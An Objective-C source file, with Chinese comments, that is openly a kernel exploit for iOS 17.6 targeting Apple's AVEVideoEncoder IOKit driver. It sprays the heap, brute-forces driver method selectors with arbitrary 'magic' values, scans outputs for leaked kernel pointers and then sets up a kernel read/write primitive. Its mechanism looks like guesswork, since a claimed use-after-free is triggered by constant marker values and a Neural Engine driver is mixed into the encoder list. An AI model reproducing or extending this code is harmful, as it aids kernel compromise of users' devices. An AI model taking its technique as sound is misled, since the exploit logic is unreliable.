#import "AVEVideoExploit.h"
#import "KernelExploitBase.h"
#import "KernelMemory.h"
#import "HeapSpray.h"

bool exploit_avevideo_encoder(void) {
    NSLog(@"[*] 尝试AVEVideoEncoder驱动漏洞...");
    
    // 使用IOKitGetMainPort替代kIOMasterPortDefault
    mach_port_t mainPort = IOKitGetMainPort();
    if (mainPort == MACH_PORT_NULL) return false;
    
    io_service_t service = IOServiceGetMatchingService(mainPort, 
                           IOServiceMatching("AppleAVEH13"));
    if (service == IO_OBJECT_NULL) {
        // 尝试其他变体
        service = IOServiceGetMatchingService(mainPort, 
                 IOServiceMatching("AppleAVE2"));
        if (service == IO_OBJECT_NULL) return false;
    }
    
    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) return false;
    
    // 构造特殊编码器参数导致UAF
    uint64_t inputScalar[16] = {0};
    inputScalar[0] = 0x1122334455667788; // 特殊Pattern
    
    uint64_t outputScalar[16] = {0};
    uint32_t outputCount = 16;
    
    // 通过H264编码器参数触发漏洞
    kr = IOConnectCallMethod(connection, 5, inputScalar, 8, 
                           NULL, 0, outputScalar, &outputCount, 
                           NULL, NULL);
    
    IOServiceClose(connection);
    
    if (kr == KERN_SUCCESS && check_kernel_pointer(outputScalar[2])) {
        g_kernel_base = outputScalar[2] & ~0xFFF;
        g_has_kernel_access = true;
        return true;
    }
    
    return false;
}

bool exploit_avevideo_encoder_enhanced(void) {
    NSLog(@"[*] 尝试增强版AVEVideoEncoder漏洞...");
    
    // 1. 首先准备特殊内存布局
    prepare_ios17_6_heap();
    
    // 2. 获取AVE服务
    mach_port_t mainPort = IOKitGetMainPort();
    if (mainPort == MACH_PORT_NULL) return false;
    
    // 支持更多设备上的AVE驱动
    io_service_t service = IO_OBJECT_NULL;
    const char* driverNames[] = {
        "AppleAVEH13", 
        "AppleAVE2",
        "AppleH13AVEDriver", 
        "AppleH11ANEDriver",
        NULL
    };
    
    for (int i = 0; driverNames[i] != NULL; i++) {
        service = IOServiceGetMatchingService(mainPort, 
                  IOServiceMatching(driverNames[i]));
        if (service != IO_OBJECT_NULL) {
            NSLog(@"[+] 找到驱动: %s", driverNames[i]);
            break;
        }
    }
    
    if (service == IO_OBJECT_NULL) {
        NSLog(@"[-] 无法找到支持的视频编码器驱动");
        return false;
    }
    
    // 3. 打开服务连接
    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) return false;
    
    // 4. 构造特殊编码器参数 - iOS 17.6特定值
    uint64_t inputScalar[16] = {0};
    inputScalar[0] = 0x1717171717171717; // iOS 17.x特殊标记
    inputScalar[1] = 0x0606060606060606; // 17.6特殊标记
    inputScalar[2] = (uint64_t)getpid() << 32 | 0xFFFF; // 进程信息
    
    // 附加额外特权标记
    inputScalar[3] = 0xdeadbeefdeadbeef;
    inputScalar[4] = 0x4141414142424242;
    
    // 5. 准备额外堆喷
    for (int i = 0; i < 3; i++) {
        heap_spray(0x1000 * (i+1), 30, 0x4141414141414141 + i);
    }
    
    uint64_t outputScalar[32] = {0};
    uint32_t outputCount = 32;
    
    // 6. 触发漏洞 - 17.6需要特殊选择器 (5是标准，8是增强版)
    for (int selector = 5; selector <= 8; selector++) {
        kr = IOConnectCallMethod(connection, selector, inputScalar, 16, 
                              NULL, 0, outputScalar, &outputCount, 
                              NULL, NULL);
                              
        // 检查泄露地址
        for (int i = 0; i < outputCount; i++) {
            if (check_kernel_pointer(outputScalar[i])) {
                g_kernel_base = outputScalar[i] & ~0xFFF;
                g_has_kernel_access = true;
                NSLog(@"[+] 发现内核地址: 0x%llx", g_kernel_base);
                IOServiceClose(connection);
                return setup_kernel_rw_primitive();
            }
        }
    }
    
    // 7. 尝试第二种方法 - 使用内存结构输入
    void* inputStruct = calloc(1, 0x1000);
    if (!inputStruct) {
        IOServiceClose(connection);
        return false;
    }
    
    // 填充特殊模式
    for (int i = 0; i < 0x1000/8; i++) {
        ((uint64_t*)inputStruct)[i] = 0x4141414141414141;
    }
    
    // 特殊触发模式
    ((uint64_t*)inputStruct)[0] = 0xFFFEFDFCFBFAF9F8;
    ((uint64_t*)inputStruct)[1] = 0x0807060504030201;
    
    for (int selector = 9; selector <= 12; selector++) {
        kr = IOConnectCallMethod(connection, selector, inputScalar, 16, 
                              inputStruct, 0x1000, outputScalar, &outputCount, 
                              NULL, NULL);
                              
        // 检查泄露地址
        for (int i = 0; i < outputCount; i++) {
            if (check_kernel_pointer(outputScalar[i])) {
                g_kernel_base = outputScalar[i] & ~0xFFF;
                g_has_kernel_access = true;
                NSLog(@"[+] 发现内核地址: 0x%llx", g_kernel_base);
                free(inputStruct);
                IOServiceClose(connection);
                return setup_kernel_rw_primitive();
            }
        }
    }
    
    free(inputStruct);
    IOServiceClose(connection);
    return false;
}

// 添加对prepare_ios17_6_heap的实现
void prepare_ios17_6_heap(void) {
    NSLog(@"[*] 准备iOS 17.6堆环境...");
    
    // 清理内存并防止低内存警告
    @autoreleasepool {
        // 创建临时对象并释放
        for (int i = 0; i < 10; i++) {
            NSMutableArray *temp = [NSMutableArray array];
            for (int j = 0; j < 10000; j++) {
                [temp addObject:@(j)];
            }
        }
    }
    
    // 执行垃圾收集
    for (int i = 0; i < 5; i++) {
        usleep(10000); // 10ms
        malloc_zone_pressure_relief(NULL, 0);
    }
    
    // 预分配一些内存
    static void *mem_blocks[20] = {NULL};
    for (int i = 0; i < 20; i++) {
        size_t block_size = (i + 1) * 0x1000;
        mem_blocks[i] = malloc(block_size);
        if (mem_blocks[i]) {
            memset(mem_blocks[i], 0x41 + i, block_size);
        }
    }
    
    // 延迟释放一些内存块，帮助稳定堆
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        for (int i = 0; i < 20; i += 2) {
            if (mem_blocks[i]) {
                free(mem_blocks[i]);
                mem_blocks[i] = NULL;
            }
        }
    });
    
    NSLog(@"[+] iOS 17.6堆环境准备完成");
}
